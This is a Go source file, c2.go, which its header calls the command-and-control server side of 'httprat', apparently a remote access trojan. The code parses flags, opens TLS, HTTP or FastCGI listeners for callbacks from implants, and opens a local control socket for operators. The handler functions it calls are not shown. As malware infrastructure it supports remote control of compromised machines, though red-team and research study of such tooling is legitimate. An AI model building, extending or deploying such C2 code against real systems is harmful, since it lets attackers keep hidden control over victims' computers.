/* c2 is the server side of httprat */
package main

/*
 * c2.go
 * C2 side of httprat
 * By J. Stuart McMurray
 * Created 20170518
 * Last Modified 20170518
 */

import (
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"net"
	"net/http"
	"net/http/fcgi"
	"os"
	"os/signal"
)

func main() {
	var (
		laddr = flag.String(
			"l",
			"0.0.0.0:4433",
			"Listen `address` and port or Unix socket path",
		)
		isUnix = flag.Bool(
			"u",
			false,
			"Address given to -l refers to a Unix domain socket",
		)
		noTLS = flag.Bool(
			"notls",
			false,
			"Disable TLS",
		)
		certF = flag.String(
			"cert",
			"",
			"TLS certificate PEM `file`",
		)
		keyF = flag.String(
			"key",
			"",
			"TLS key PEM `file`",
		)
		serveFCGI = flag.Bool(
			"fcgi",
			false,
			"Serve fcgi, not http(s)",
		)
		c2Path = flag.String(
			"csock",
			"./c2.sock",
			"Control socket `path` or address",
		)
		c2IP = flag.Bool(
			"csockip",
			false,
			"Treat the control socket path as an IP address and "+
				"port",
		)
	)
	flag.Usage = func() {
		fmt.Fprintf(
			os.Stderr,
			`Usage: %v [options]

/* TODO: Finish this */

Options:
`,
			os.Args[0],
		)
		flag.PrintDefaults()
	}
	flag.Parse()

	log.SetOutput(os.Stdout)

	/* Make sure we have a TLS certificate and key */
	var (
		cert tls.Certificate
	)
	if !*serveFCGI && !*noTLS && !*isUnix {
		cert = getCertificate(*laddr, *certF, *keyF)
	}

	/* Register handler for callbacks */
	http.HandleFunc("/", handleClient)

	/* Handle local C2 */
	c2sock := listen(*c2Path, !*c2IP)
	log.Printf("Listening for controller connections to %v", c2sock.Addr())
	go handleControllers(c2sock)

	/* Listen on the given address */
	il := listen(*laddr, *isUnix)

	/* Close sockets on Ctrl+C, to unlink unix sockets */
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt)
	go func() {
		for sig := range c {
			log.Printf("Captured %v, closing listeners", sig)
			il.Close()
			c2sock.Close()
			log.Printf("Done.")

			os.Exit(1)
		}
	}()

	/* Wrap in TLS if we're meant to */
	l := il
	if !*serveFCGI && !*noTLS && !*isUnix {
		l = tls.NewListener(l, &tls.Config{
			Certificates: []tls.Certificate{cert},
		})
	}

	/* Serve */
	if *serveFCGI {
		log.Printf("Listening for FCGI connections to %v", l.Addr())
		if err := fcgi.Serve(l, nil); nil != err {
			log.Fatalf("Error: %v", err)
		}
	}
	proto := "https"
	if *noTLS {
		proto = "http"
	}
	log.Printf("Listening for %v connections to %v", proto, l.Addr())
	if err := http.Serve(l, nil); nil != err {
		log.Fatalf("Error: %v", err)
	}
}

/* Listen listens on the given address.  It assumes a is (or resolves to) an IP
address, unless isUnix is true, in which case it assumes it's a Unix Domain
Socket. */
func listen(a string, isUnix bool) net.Listener {
	/* Make sure we actually have a listen address */
	if "" == a {
		log.Fatalf("No listen address given")
	}

	/* TCP/IP is easy */
	if !isUnix {
		l, err := net.Listen("tcp", a)
		if nil != err {
			log.Fatalf("Unable to listen on %v: %v", a, err)
		}
		return l
	}

	/* "Resolve" the path */
	ua, err := net.ResolveUnixAddr("unix", a)
	if nil != err {
		log.Fatalf(
			"Unable to resolve Unix domain socket address %v: %v",
			ua,
			err,
		)
	}

	/* Try and listen on it */
	l, err := net.ListenUnix("unix", ua)
	if nil != err {
		log.Fatalf(
			"Unable to listen on Unix domain socket "+
				"%v: %v",
			ua,
			err,
		)
	}
	l.SetUnlinkOnClose(true)
	return l
}
